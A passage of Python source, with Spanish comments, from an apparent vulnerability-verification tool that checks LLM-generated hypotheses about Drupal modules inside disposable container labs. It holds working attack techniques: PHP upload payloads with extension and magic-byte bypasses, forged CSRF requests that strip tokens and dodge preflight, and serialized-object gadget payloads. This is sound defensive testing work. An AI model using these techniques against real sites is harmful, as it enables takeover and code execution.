                         "confirmado": confirmed})
            if confirmed:
                confirmed_entry = tried[-1]
                break
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
            "metodo": m, "endpoint": endpoint, "intentos": tried,
        })

        if confirmed_entry:
            res.verified = True
            res.ok = True
            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
            res.evidence["location_recibida"] = confirmed_entry["location"]
            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
                          f"con Location={confirmed_entry['location']!r}")
            step("VERIFICADO: Location contiene el dominio externo enviado.")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de bypass para {redirect_param} y "
                          f"ninguna produjo un redirect con '{evil_host}' en Location")
            if tried:
                first = tried[0]
                res.evidence["respuesta_cuerpo_recorte"] = (
                    f"status={first.get('status')} location={first.get('location')!r}")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_file_upload(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, file_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Undecima clase de Drupal ("poco a poco"): equivalente a verify_wordpress_file_upload.
    Busca el fichero subido en sites/default/files (ver find_in_webroot) en vez de
    wp-content/uploads -- el resto de la logica (magic bytes, doble extension, cadena .htaccess)
    es igual. Nota: Drupal core NIEGA ejecucion de PHP dentro de sites/*/files via .htaccess por
    defecto (el que trae el propio core, no uno que el atacante suba) en instalaciones Apache
    estandar -- asi que la cadena .htaccess del atacante solo funciona si el modulo vulnerable
    permite subir a una ruta FUERA de sites/*/files, o si el Apache del objetivo esta mal
    configurado y no respeta el .htaccess de Drupal (AllowOverride None lo rompe); se deja la
    prueba igual porque sigue siendo una tecnica real contra configuraciones debiles."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    file_param = file_param_hint or _pick_param(parameters, _FILE_UPLOAD_HINTS)
    if not file_param:
        res.detail = "no se identifico el parametro (campo de formulario) del fichero subido"
        res.limitations.append("la verificacion de file-upload necesita saber que campo lleva el "
                               "fichero; afina 'parameters' en la hipotesis del LLM o pasalo a "
                               "mano (file_param_hint)")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        m = (http_method or "POST").upper()
        variants = [
            ("binoracle_{t}.php", b"", "image/jpeg"), ("binoracle_{t}.php.jpg", b"", "image/jpeg"),
            ("binoracle_{t}.phtml", b"", "image/jpeg"), ("binoracle_{t}.php5", b"", "image/jpeg"),
            ("binoracle_{t}.php7", b"", "image/jpeg"), ("binoracle_{t}.php3", b"", "image/jpeg"),
            ("binoracle_{t}.pht", b"", "image/jpeg"), ("binoracle_{t}.phar", b"", "application/octet-stream"),
            ("binoracle_{t}.pHp", b"", "image/jpeg"), ("binoracle_{t}.jpg.php", b"", "image/jpeg"),
            ("binoracle_{t}.php;.jpg", b"", "image/jpeg"),
            ("binoracle_{t}.jpg", b"GIF89a;", "image/gif"),
            ("binoracle_{t}.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),
            ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),
        ]
        other_params = {k: v for k, v in (dict(parameters) if isinstance(parameters, dict)
                                          else dict.fromkeys(parameters or [], "")).items()
                        if k != file_param}
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "file_param": file_param, "metodo": m, "endpoint": endpoint,
        })

        found = False
        tried = []
        first_resp_captured = False
        for tmpl, magic, content_type in variants:
            token = _token()
            fname = tmpl.format(t=token)
            a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
            expected = a + b
            php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
            step(f"subiendo '{fname}' con {file_param} (magic bytes={magic!r})...")
            try:
                resp = boot.sub_sess.request(
                    m, boot.base_url + endpoint, data=other_params,
                    files={file_param: (fname, php_payload, content_type)}, timeout=20)
            except Exception as e:
                tried.append({"filename": fname, "error_subida": str(e)})
                continue
            if not first_resp_captured:
                res.evidence["respuesta_muestra_primer_intento"] = (resp.text or "")[:500]
                first_resp_captured = True
            found_path = lab.find_in_webroot(token)
            entry = {"filename": fname, "status_subida": resp.status_code,
                    "encontrado_en_contenedor": found_path}
            if not found_path:
                tried.append(entry)
                continue
            rel = found_path.replace("/opt/drupal/web", "", 1)
            candidate_url = boot.base_url + rel
            entry["url_publica"] = candidate_url
            step(f"'{fname}' se guardo en {found_path}; pidiendolo directo para ver si se EJECUTA...")
            try:
                import requests as _requests
                r2 = _requests.get(candidate_url, timeout=15)
            except Exception as e:
                entry["error_peticion_directa"] = str(e)
                tried.append(entry)
                continue
            pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
            executed = bool(pattern.search(r2.text or ""))
            entry["status_peticion_directa"] = r2.status_code
            entry["suma_esperada"] = expected
            entry["suma_presente"] = executed
            tried.append(entry)
            if executed:
                found = True
                res.evidence["filename_ganador"] = fname
                res.evidence["url_publica_ganadora"] = candidate_url
                res.evidence["status_code_respuesta"] = r2.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
                step(f"VERIFICADO: {candidate_url} devolvio {expected} (={a}+{b}) -- el fichero "
                     f"subido se EJECUTA como PHP.")
                break
        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"FILE UPLOAD confirmado: '{res.evidence['filename_ganador']}' se "
                          f"subio via {file_param} y se EJECUTO como PHP al pedirlo en "
                          f"{res.evidence['url_publica_ganadora']}")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de nombre/extension/magic-bytes y "
                          f"ninguna produjo un fichero que se ejecutara como PHP -- el "
                          f"file-upload no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_csrf(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, email_param_hint: str = "", pass_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Duodecima clase de Drupal ("poco a poco"): equivalente a verify_wordpress_csrf. Mismo
    self-CSRF (el superusuario uid=1 se ataca a si mismo) y las mismas variantes de entrega
    (form-encoded, JSON, JSON via text/plain). Se quita cualquier campo 'form_token'/'nonce'/
    'token'/'csrf' ademas del form_build_id (Drupal, a diferencia de WordPress, exige
    form_build_id en TODO formulario Form API, pero muchas rutas custom/REST se saltan el Form
    API entero y no lo piden -- si el endpoint es asi, esta peticion desnuda funciona igual)."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    email_p = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
    pass_p = pass_param_hint or _pick_param(parameters, _PASS_HINTS)
    if not (email_p or pass_p):
        res.detail = "no se identifico un parametro de email ni de password en la hipotesis"
        res.limitations.append("la verificacion de CSRF (self-targeting) necesita un parametro "
                               "de email o de password; afina 'parameters' en la hipotesis del "
                               "LLM o pasalos a mano")
        return res

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res
        if boot.admin_sess is None:
            res.detail = ("no se pudo autenticar como admin con su password original -- no se "
                          "puede simular el self-CSRF sin esa sesion")
            return res

        m = (http_method or "POST").upper()
        payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        for k in list(payload.keys()):
            if any(h in k.lower() for h in ("nonce", "token", "csrf", "form_build_id")):
                del payload[k]
        new_email = f"csrf-takeover-{_token()}@binoracle-lab.invalid" if email_p else None
        new_pass = secrets.token_urlsafe(10) if pass_p else None
        if email_p:
            payload[email_p] = new_email
        if pass_p:
            payload[pass_p] = new_pass
        id_p = _pick_param(parameters, _ID_HINTS)
        if id_p:
            endpoint, path_substituted = _substitute_path_param(endpoint, id_p, "1")
            if not path_substituted:
                payload[id_p] = "1"   # uid=1, el superusuario -- ver _bootstrap_drupal_lab

        headers_base = {"Origin": "https://binoracle-csrf-lab.invalid",
                        "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
        res.evidence.update({
            "admin_user": boot.admin_user, "admin_password_original": boot.admin_pass,
            "payload_forjado": payload, "origin_ficticio": headers_base["Origin"],
            "metodo": m, "endpoint": endpoint,
        })

        def check_effect():
            if new_pass:
                sess = _drupal_login(boot.base_url, boot.admin_user, new_pass)
                return sess is not None
            if new_email:
                r = lab.drush("user:information", boot.admin_user, "--format=json", timeout=30)
                try:
                    import json as _json
                    info = _json.loads(r.stdout or "{}")
                    first = next(iter(info.values())) if isinstance(info, dict) and info else {}
                    return (first.get("mail") or "").strip() == new_email
                except Exception:
                    return False
            return False

        import json as _json_mod
        delivery_attempts = [
            ("form-encoded (formulario real)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, data=payload if m != "GET" else None,
                params=payload if m == "GET" else None, headers=headers_base, timeout=20)),
            ("JSON (application/json)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, json=payload,
                headers={**headers_base, "Content-Type": "application/json"}, timeout=20)),
            ("JSON via text/plain (bypass de preflight)", lambda: boot.admin_sess.request(
                m, boot.base_url + endpoint, data=_json_mod.dumps(payload),
                headers={**headers_base, "Content-Type": "text/plain"}, timeout=20)),
        ]
        confirmed = False
        delivery_tried = []
        for label, send_fn in delivery_attempts:
            step(f"enviando la peticion forjada -- {label}, sesion del admin, SIN token, "
                 f"Origin/Referer externo ficticio...")
            try:
                resp = send_fn()
                status = resp.status_code
            except Exception as e:
                delivery_tried.append({"modo": label, "error": str(e)})
                continue
            ok_effect = check_effect()
            delivery_tried.append({"modo": label, "status": status, "efecto_confirmado": ok_effect})
            if ok_effect:
                confirmed = True
                res.evidence["modo_entrega_ganador"] = label
                res.evidence["status_code_respuesta"] = status
                break
        res.evidence["intentos_entrega"] = delivery_tried
        if new_pass:
            res.evidence["segundo_login_password_nueva"] = confirmed
        elif new_email:
            res.evidence["email_esperado"] = new_email

        if confirmed:
            res.verified = True
            res.ok = True
            res.detail = (f"CSRF confirmado ({res.evidence['modo_entrega_ganador']}): una "
                          f"peticion SIN token, con Origin/Referer externo ficticio, usando la "
                          f"sesion YA autenticada del admin, cambio de verdad su propia cuenta")
            step(f"VERIFICADO: CSRF confirmado ({res.evidence['modo_entrega_ganador']}).")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(delivery_tried)} formas de entrega y en ninguna se "
                          f"confirmo el efecto -- el CSRF no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()


def verify_drupal_deserialization(
    module_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, serial_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
) -> WpVerifyResult:
    """Decimotercera clase de Drupal ("poco a poco"): equivalente a
    verify_wordpress_deserialization. Mismo escaneo estatico del codigo real del modulo
    (find_file_write_gadget, ver deserialize_gadgets.py) seguido de la misma prueba dinamica
    dura: construir el objeto PHP serializado de verdad y confirmar leyendo el fichero REAL
    dentro del contenedor."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(module_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    from .deserialize_gadgets import find_file_write_gadget, build_php_serialized_object
    from .wpverify import _SERIAL_HINTS
    module_root = os.path.join(module_source_dir, slug)
    step("escaneando el codigo real en busca de un gadget de deserializacion (clase con "
         "__wakeup()/__destruct() que escriba a fichero)...")
    gadget = find_file_write_gadget(module_root)
    if gadget is None:
        res.detail = ("no se encontro ningun gadget de deserializacion en el codigo del modulo "
                      "(una clase con __wakeup()/__destruct() que escriba una propiedad publica "
                      "a una ruta publica via file_put_contents())")
        res.limitations.append("la verificacion de deserializacion SOLO cubre gadgets dentro del "
                               "propio codigo del modulo (no cadenas de librerias de terceros); "
                               "si el modulo no trae una clase asi, no hay nada que verificar "
                               "sin inventarse una cadena que no esta")
        return res
    step(f"gadget encontrado: clase '{gadget.full_class_name}' en {gadget.file}:{gadget.line} "
         f"({gadget.magic_method} -> file_put_contents($this->{gadget.path_prop}, "
         f"$this->{gadget.content_prop}))")

    serial_param = serial_param_hint or _pick_param(parameters, _SERIAL_HINTS)

    lab = _Lab(_token())
    try:
        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
        payload_obj = build_php_serialized_object(gadget, canary_path, secret)
        m = (http_method or "POST").upper()
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "gadget_clase": gadget.full_class_name, "gadget_metodo": gadget.magic_method,
            "gadget_ubicacion": f"{gadget.file}:{gadget.line}", "canary_path": canary_path,
            "canary_secret": secret, "objeto_serializado": payload_obj,
            "serial_param": serial_param or "(cuerpo crudo)", "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            time.sleep(1)
            r = lab.sh("exec", lab.drupal, "sh", "-c", f"cat {canary_path} 2>/dev/null", timeout=10)
            content = (r.stdout or "")
            present = secret in content
            tried.append({"modo": label, "secreto_presente": present})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                res.evidence["contenido_fichero"] = content[:500]
                step(f"VERIFICADO: el fichero {canary_path} contiene el secreto exacto -- "
                     f"unserialize() reconstruyo el objeto y {gadget.magic_method} se ejecuto.")

        if serial_param:
            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
            payload[serial_param] = payload_obj
            try_send("parametro de formulario",
                     data=payload if m != "GET" else None,
                     params=payload if m == "GET" else None)
        if not found:
            try_send("cuerpo crudo", data=payload_obj.encode())

        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            res.detail = (f"DESERIALIZATION confirmada ({res.evidence['modo_ganador']}): el "
                          f"objeto PHP serializado de la clase '{gadget.full_class_name}' se "
                          f"reconstruyo de verdad y su {gadget.magic_method} escribio el secreto "
                          f"exacto en {canary_path}")
        else:
            res.ok = True
            res.detail = (f"se encontro el gadget '{gadget.full_class_name}' en el codigo pero "
                          f"ninguna forma de mandarlo ({len(tried)} probadas) hizo que el "
                          f"fichero canario apareciera con el secreto -- la deserializacion no "
                          f"se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red)...")
        lab.teardown()
